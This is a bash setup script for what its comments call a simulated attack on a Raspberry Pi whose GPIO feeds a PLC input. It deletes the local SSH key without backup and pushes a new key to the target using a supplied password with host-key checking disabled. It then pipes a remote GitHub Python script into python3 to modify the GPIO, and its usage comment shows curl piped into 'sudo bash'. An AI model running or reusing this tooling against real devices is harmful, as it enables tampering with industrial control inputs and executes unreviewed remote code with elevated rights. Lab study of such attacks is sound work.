#!/usr/bin/env bash

# This script is the pre-configuration before performing the simulated attack to modify the Raspberry Pi GPIO

# Script execution example:
# curl -sL https://raw.githubusercontent.com/L1LBRO/Modificar-GPIO-Raspberry-Pi/refs/heads/main/Configuracion_previa_ssh.sh | sudo bash -s

# Define color constants
colorBlue='\033[0;34m'
colorLightBlue='\033[1;34m'
colorGreen='\033[1;32m'
colorRed='\033[1;31m'
colorEnd='\033[0m'

echo ""
echo -e "${colorLightBlue} Starting the Raspberry Pi GPIO modification script...${colorEnd}"
echo ""

# Verify number of parameters
if [ $# -ne 5 ]; then
    echo "" 
    echo "Usage: $0 <IP> <Passphrase> <User> <PLC Input %IX0.x> <RaspberryPass>"
    echo ""
    exit 1
fi

# Parameters
RPI_IP=$1
SSH_PASSPHRASE=$2
RPI_USER=$3
PLC_INPUT=$4
RPI_PASSWORD=$5 

# Generate ssh keys
echo ""
echo "Generating SSH keys to connect to the Raspberry Pi..."
echo ""

# Key file path
SSH_KEY_PATH="${HOME}/.ssh/id_rsa"

# Remove if the key already exists
if [ -f "$SSH_KEY_PATH" ]; then
    rm -f "$SSH_KEY_PATH"
fi

# Generate the ssh key
ssh-keygen -t rsa -b 4096 -f "$SSH_KEY_PATH" -C "$RPI_USER@$RPI_IP" -N "$SSH_PASSPHRASE"

if [ $? -eq 0 ]; then
    echo ""
    echo "SSH key generated successfully at $SSH_KEY_PATH."
    echo ""
else
    echo ""
    echo "There was an error generating the SSH key."
    echo ""
    exit 1
fi

echo ""
echo "Sending the SSH keys to the target machine..."
echo ""

# Install sshpass if not installed
echo "Installing sshpass..."
sudo apt install sshpass -y

# Ensure public key permissions are correct
chmod 644 "${HOME}/.ssh/id_rsa.pub"

# Use sshpass to copy the SSH key with the provided password
echo "Sending the SSH public key with ssh-copy-id..."
sshpass -p "$RPI_PASSWORD" ssh-copy-id -o StrictHostKeyChecking=no -i "${HOME}/.ssh/id_rsa.pub" "$RPI_USER@$RPI_IP"

if [ $? -eq 0 ]; then
    echo ""
    echo "Keys sent successfully."
    echo ""
else
    echo ""
    echo "There was an error sending the SSH key. Check SSH logs on the Raspberry Pi."
    echo ""
    exit 1
fi

echo ""
echo "Installing required packages..."
echo ""

# Package required for SSH connection via python
cd ~
git clone https://github.com/WiringPi/WiringPi.git
cd WiringPi
./build

if [ $? -eq 0 ]; then
    echo ""
    echo "WiringPi package installed successfully."
    echo ""
else
    echo ""
    echo "There was an error installing the WiringPi package."
    echo ""
    exit 1
fi

echo ""
echo "GPIO version"
echo ""
gpio -v

echo ""
echo "Installing Paramiko..."
echo ""

# Install Paramiko
sudo apt install python3-paramiko -y

if [ $? -eq 0 ]; then
    echo ""
    echo "Paramiko package installed successfully."
    echo ""
else
    echo ""
    echo "There was an error installing the Paramiko package."
    echo ""
    exit 1
fi

# Call the Python script to modify the GPIO
echo "Running Python script to modify GPIO..."
curl -sL https://raw.githubusercontent.com/L1LBRO/Modify-GPIO-Raspberry-Pi/refs/heads/main/Gpio_Mod_exit.py | python3 - "$RPI_IP" "$SSH_KEY_PATH" "$SSH_PASSPHRASE" "$RPI_USER" "$PLC_INPUT"
